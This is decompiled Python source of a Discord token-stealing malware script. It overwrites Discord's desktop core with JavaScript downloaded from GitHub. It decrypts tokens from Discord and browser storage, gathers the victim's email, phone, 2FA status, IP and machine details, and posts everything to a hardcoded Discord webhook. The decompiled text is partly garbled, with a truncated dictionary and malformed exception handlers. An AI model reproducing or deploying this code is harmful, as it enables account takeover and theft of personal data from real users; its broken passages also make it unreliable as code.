# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: xen.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import json
import requests
import re
import subprocess
from datetime import datetime
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from subprocess import Popen, PIPE
from os import listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
tokens = []
cleaned = []
checker = []
WEBHOOK_URL = 'https://discord.com/api/webhooks/1283797875561857034/IOMrN3hdS7uHPsIPwA9AERevpzmIUGy2px1M6UHWXEkc4DuAYKTB4b1nE9NVdhjAVAA3'
INJECTION_ENABLED = True

class Injection:
    def __init__(self, webhook_url: str) -> None:
        self.webhook_url = webhook_url
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [os.path.join(self.appdata, 'Discord'), os.path.join(self.appdata, 'DiscordCanary'), os.path.join(self.appdata, 'DiscordPTB'), os.path.join(self.appdata, 'DiscordDevelopment')]
        self.code = requests.get('https://raw.githubusercontent.com/patrickzxxxxq/injection/main/etitz.js').text
        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue
            core_info = self.get_core(dir)
            if core_info is not None:
                core_dir, core_file = core_info
                with open(os.path.join(core_dir, 'index.js'), 'w', encoding='utf-8') as f:
                    f.write(self.code.replace('discord_desktop_core-1', core_file).replace('%WEBHOOK%', webhook_url))
                    self.start_discord(dir)

    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search('app-+?', file):
                modules = os.path.join(dir, file, 'modules')
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search('discord_desktop_core-+?', file):
                        core = os.path.join(modules, file, 'discord_desktop_core')
                        if not os.path.exists(os.path.join(core, 'index.js')):
                            continue
                        return (core, file)

    def start_discord(self, dir: str) -> None:
        update = os.path.join(dir, 'Update.exe')
        executable = os.path.join(dir.split('\\')[(-1)] + '.exe')
        for file in os.listdir(dir):
            if re.search('app-+?', file):
                app = os.path.join(dir, file)
                if os.path.exists(os.path.join(app, 'modules')):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = os.path.join(app, executable)
                            subprocess.call([update, '--processStart', executable], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:(-16)].decode()
    except:
        return 'Error'

def getip():
    ip = 'None'
    try:
        ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()
    except:
        pass
    return ip

def gethwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]

def revshit_xen():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + '\\Google\\Chrome\\User Data'
    paths = {'Discord': roaming + '\\discord', 'Discord Canary': roaming + '\\discordcanary', 'Lightcord': roaming + '\\Lightcord', 'Discord PTB': roaming + '\\discordptb', 'Opera': roaming + '\\Opera Software\\Opera Stable', 'Opera GX': roaming + '\\Opera Software\\Opera GX Stable', 'Amigo': local + '\\Amigo\\User Data', 'Torch': local + '\\Torch\\User Data', 'Kometa': local + '\\Kometa\\User Data', 'Orbitum': local + '\\Orbitum\\User Data', 'CentBrowser': local + '\\CentBrowser\\User Data', '7Star': local + '\\7Star\\7Star\\User Data', 'Sputnik': local + '\\Sputnik\\Sputnik\\User Data', 'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data', 'Chrome': chrome + 'Default', 'Epic Privacy Browser': chrome + '\\Microsoft\\Edge\\User Data\\Defaul', 'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default', 'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default', 'Brave':
        pass  # postinserted
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        try:
            with open(path + '\\Local State', 'r') as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
    except:
        pass
                for file in listdir(path + '\\Local Storage\\leveldb\\'):
                    if not file.endswith('.ldb') and file.endswith('.log'):
                        continue
                    try:
                        with open(path + f'\\Local Storage\\leveldb\\{file}', 'r', errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\\"]*', x):
                                    tokens.append(values)
                    except PermissionError:
                            continue
                for i in tokens:
                    if i.endswith('\\'):
                        i.replace('\\', '')
                    else:  # inserted
                        if i not in cleaned:
                            cleaned.append(i)
                for token in cleaned:
                    try:
                        xen1 = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                    except IndexError == 'Error':
                        continue
                    checker.append(xen1)
                    for value in checker:
                        if value not in already_check:
                            already_check.append(value)
                            headers = {'Authorization': xen1, 'Content-Type': 'application/json'}
                            try:
                                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                            except Exception as e:
                                print(f'API request error: {e}')
                                continue
                            if res.status_code == 200:
                                res_json = res.json()
                                ip = getip()
                                pc_username = os.getenv('UserName')
                                pc_name = os.getenv('COMPUTERNAME')
                                user_name = f"{res_json['username']}#{res_json['discriminator']}"
                                user_id = res_json['id']
                                email = res_json['email']
                                phone = res_json['phone']
                                mfa_enabled = res_json['mfa_enabled']
                                has_nitro = False
                                res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                                nitro_data = res.json()
                                has_nitro = bool(len(nitro_data) > 0)
                                days_left = 0
                                if has_nitro:
                                    d1 = datetime.strptime(nitro_data[0]['current_period_end'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                                    d2 = datetime.strptime(nitro_data[0]['current_period_start'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                                    days_left = abs((d2 + d1).days)
                                thumbnail_url = 'https://i.hizliresim.com/9q7i80f.png'
                                embed = f"**{user_name}** *({user_id})*\n\n📑 **Account Information**\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{(days_left if days_left else 'None')} day(s)`\n\n💻 **PC Information**\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n\n🔑 **Token**\n\t```{xen1}```\n\n"
                                webhook_url = 'https://discord.com/api/webhooks/1283797875561857034/IOMrN3hdS7uHPsIPwA9AERevpzmIUGy2px1M6UHWXEkc4DuAYKTB4b1nE9NVdhjAVAA3'
                                webhook_name = '✘'
                                webhook_avatar = 'https://i.hizliresim.com/t1k9kze.jpg'
                                payload = {'content': '', 'embeds': [{'title': '🔒 **__User Information__**', 'description': embed, 'thumbnail': {'url': thumbnail_url}, 'color': 396305}], 'username': webhook_name, 'avatar_url': webhook_avatar}
                                headers2 = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                                try:
                                    req = Request(webhook_url, data=json.dumps(payload).encode(), headers=headers2)
                                    urlopen(req)
                                except Exception as e:
                                    print(f'Webhook request error: {e}')
if __name__ == '__main__':
    if INJECTION_ENABLED:
        injection = Injection(WEBHOOK_URL)
    revshit_xen()